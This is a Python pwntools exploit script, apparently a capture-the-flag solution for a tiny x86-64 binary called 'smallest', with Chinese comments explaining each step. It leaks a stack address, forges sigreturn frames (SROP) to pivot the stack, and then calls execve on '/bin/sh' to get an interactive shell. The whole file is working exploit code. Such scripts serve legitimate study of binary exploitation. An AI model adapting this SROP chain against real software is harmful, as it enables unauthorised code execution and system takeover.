#!/usr/bin/env python
#-*- encoding=utf-8 -*-
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#context.terminal = ['lxterminal', '-e']

p = process('./smallest')
elf = ELF('./smallest')

#gdb.attach(p)

main_addr = 0x4000b0
syscall_addr = 0x4000be

payload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入
raw_input('@main*3')
p.send(payload)

payload = '\xb3' # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址
raw_input('@leak stack')
p.send(payload)
p.recv(8)
stack_addr = u64(p.recv(8))
info('stack_addr = ' + hex(stack_addr))

payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturn
frame = SigreturnFrame()
frame.rax = 0 # sys_read的调用号
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = syscall_addr
payload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上
raw_input('@fake sigcontext to pivot stack')
p.send(payload)

payload = p64(syscall_addr).ljust(15, 'A') # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）
raw_input('@set rax=15')
p.send(payload)

# 下面开始往新的栈上写东西
bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址
payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturn
frame = SigreturnFrame()
frame.rax = 59 # sys_execve的调用号
frame.rdi = bin_sh_addr
frame.rip = syscall_addr
payload += str(frame) + '/bin/sh\x00' # 开shell
raw_input('@fake sigcontext to exec shell')
p.send(payload)

payload = p64(syscall_addr).ljust(15, 'A') # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）
raw_input('@set rax=15')
p.send(payload)

p.interactive()
